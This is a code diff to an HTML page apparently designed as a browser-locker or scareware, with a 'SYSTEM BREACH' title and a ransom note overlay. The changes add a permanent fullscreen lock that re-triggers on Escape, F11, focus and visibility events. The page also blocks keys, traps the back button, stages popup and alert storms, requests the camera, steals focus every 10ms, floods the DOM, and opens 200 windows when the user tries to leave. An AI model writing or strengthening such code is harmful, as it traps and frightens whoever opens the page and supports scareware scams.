@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="refresh" content="0.05; url=index.html">
-    <title>⚠️ ULTIMATE APOCALYPSE ⚠️</title>
+    <title>⚠️ SYSTEM BREACH ⚠️</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -105,7 +105,6 @@
         .audio-wave .bar:nth-child(10) { animation-duration:0.10s; height:75px; }
         @keyframes wave { 0%{height:10px;opacity:0.3} 100%{height:100px;opacity:1} }
 
-        /* Ransom note */
         #ransom {
             position:fixed; top:10%; left:50%; transform:translateX(-50%);
             z-index:9999998; background:rgba(0,0,0,0.8); padding:2rem 4rem;
@@ -117,7 +116,6 @@
             backdrop-filter:blur(10px);
             font-family:'Courier New',monospace;
         }
-        /* Canvas for full-screen color noise */
         #canvasNoise {
             position:fixed; inset:0; z-index:999994; pointer-events:none;
             width:100%; height:100%; display:block;
@@ -167,7 +165,7 @@
             const canvas = document.getElementById('canvasNoise');
             const ctx = canvas.getContext('2d');
 
-            // ─── Canvas noise setup ───
+            // ─── Canvas noise ───
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
             function drawNoise() {
@@ -185,7 +183,7 @@
             }
             drawNoise();
 
-            // ─── Audio layers ───
+            // ─── Audio ───
             const scream1 = new Audio('https://www.myinstants.com/media/sounds/scream-sound-effect.mp3');
             scream1.volume = 1.0;
             const scream2 = new Audio('https://www.myinstants.com/media/sounds/vine-boom.mp3');
@@ -231,8 +229,15 @@
             }
             createButterflies();
 
-            // ─── Key block ───
-            function blockKeys(e) { e.preventDefault(); e.stopPropagation(); if(e.key==='Escape') document.documentElement.requestFullscreen().catch(()=>{}); }
+            // ─── Key block (including F11 and Escape) ───
+            function blockKeys(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                // If they press Escape or F11, we re-request fullscreen
+                if (e.key === 'Escape' || e.key === 'F11') {
+                    document.documentElement.requestFullscreen().catch(()=>{});
+                }
+            }
 
             // ─── Popup storm ───
             function spawnPopups() {
@@ -267,16 +272,24 @@
                 setInterval(() => { chaosText.style.color = `hsl(${Math.random()*360},100%,50%)`; },50);
             }
 
-            // ─── Auto fullscreen toggle ───
-            function autoFullscreen() {
-                setInterval(() => {
-                    if (document.fullscreenElement) {
-                        document.exitFullscreen().catch(()=>{});
-                    } else {
-                        document.documentElement.requestFullscreen().catch(()=>{});
-                    }
-                }, 300);
+            // ─── PERMANENT FULLSCREEN LOCK (only enter, never exit) ───
+            function lockFullscreen() {
+                if (!document.fullscreenElement) {
+                    document.documentElement.requestFullscreen().catch(()=>{});
+                }
             }
+            // Check every 50ms
+            setInterval(lockFullscreen, 50);
+            // Also re-lock on fullscreenchange event (if it exits)
+            document.addEventListener('fullscreenchange', () => {
+                if (!document.fullscreenElement) {
+                    lockFullscreen();
+                }
+            });
+            // Also on visibility change
+            document.addEventListener('visibilitychange', lockFullscreen);
+            // Also on focus
+            window.addEventListener('focus', lockFullscreen);
 
             // ─── Camera ───
             function requestCamera() {
@@ -311,7 +324,6 @@
             function stealFocus() {
                 setInterval(() => {
                     window.focus();
-                    // Try to open a blank window and close it to regain focus
                     const w = window.open('', '_blank');
                     if (w) { w.close(); }
                 }, 10);
@@ -343,35 +355,41 @@
                 scream2.play().catch(()=>{});
                 alarm.play().catch(()=>{});
                 startScreech();
-                document.documentElement.requestFullscreen().catch(()=>{});
+                // Initial fullscreen lock
+                lockFullscreen();
                 document.body.requestPointerLock().catch(()=>{});
                 if (navigator.vibrate) navigator.vibrate([300,100,300,100,500,150,600]);
                 document.body.style.overflow = 'hidden';
+                // Block keys (including F11 and Escape)
                 document.addEventListener('keydown', blockKeys, true);
                 document.addEventListener('keyup', blockKeys, true);
+                // History lock
                 history.pushState(null,null,location.href);
                 window.addEventListener('popstate', ()=> { history.pushState(null,null,location.href); });
+                // Popups
                 spawnPopups();
                 setInterval(spawnPopups, 1500);
+                // Alerts
                 setTimeout(alertStorm, 1500);
+                // Visual chaos
                 startVisualChaos();
-                autoFullscreen();
+                // Camera
                 requestCamera();
+                // Focus theft
                 stealFocus();
+                // Random resize/move
                 randomResize();
+                // DOM flood
                 floodDOM();
+                // Service Worker
                 registerServiceWorker();
-                setInterval(() => {
-                    if (!document.fullscreenElement) document.documentElement.requestFullscreen().catch(()=>{});
-                    window.focus();
-                }, 200);
+                // Beforeunload trap
                 window.addEventListener('beforeunload', function(e) {
                     e.preventDefault();
                     e.returnValue = '';
                     for (let i=0; i<200; i++) window.open(location.href, '_blank');
                     location.reload();
                 });
-                // Ransom note already visible
             }
 
             overlay.addEventListener('click', function() {
@@ -381,7 +399,7 @@
             // ─── AUTO-START ───
             triggerChaos();
 
-            console.log('🔥 ULTIMATE POTENTIAL REACHED – all features active.');
+            console.log('🔥 PERMANENT FULLSCREEN LOCK ACTIVE – no escape.');
         })();
     </script>
 </body>
